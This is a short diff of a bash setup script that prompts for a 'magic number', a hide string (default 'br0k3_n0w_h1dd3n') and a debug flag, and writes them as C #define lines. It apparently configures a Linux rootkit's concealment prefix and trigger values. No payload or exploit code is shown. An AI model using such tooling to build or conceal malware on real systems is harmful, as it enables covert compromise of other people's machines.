@@ -44,15 +44,15 @@ read -ep "Magic number(ex: 1111): " magic_number
 [[ -n ${magic_number//[0-9]/} ]] && echo "Type a valid number" >&2 && exit 1
 [[ ${#magic_number} -lt 4 ]] && echo "Type at least 4 numbers" >&2 && exit 2
 
-read -ep "Magic prefix(ex: br0k3): " magic_prefix
-[[ ! ${magic_prefix} ]] && magic_prefix="br0k3_n0w_h1dd3n"
-[[ ${#magic_prefix} -lt 5 ]] && echo "Type at least 5 chars" >&2 && exit 2
+read -ep "Magic hide(ex: br0k3_n0w_h1dd3n): " magic_hide
+[[ ! ${magic_hide} ]] && magic_hide="br0k3_n0w_h1dd3n"
+[[ ${#magic_hide} -lt 5 ]] && echo "Type at least 5 chars" >&2 && exit 2
 
 read -ep "Active debug?(y/n): " debug
 [[ ! ${debug} ]] && debug="n"
 
 config_header=""
-config_header+="#define PREFIX \"${magic_prefix}\"\n"
+config_header+="#define MAGIC_HIDE \"${magic_hide}\"\n"
 config_header+="#define MAGIC_VALUE \"${magic_value}\"\n"
 config_header+="#define MAGIC_NUMBER ${magic_number}\n"
 [[ $debug =~ ^[Yy]$ ]] && config_header+="#define DEBUG\n"
